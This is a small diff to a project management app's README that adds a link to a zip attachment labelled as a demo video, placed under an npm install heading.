@@ -89,3 +89,5 @@ Goal: Deliver the final solution and showcase functionality.
 
 # npm install
 
+[Project_Management_App_Project Demo Video.zip](https://github.com/user-attachments/files/22558937/Project_Management_App_Project.Demo.Video.zip)
+
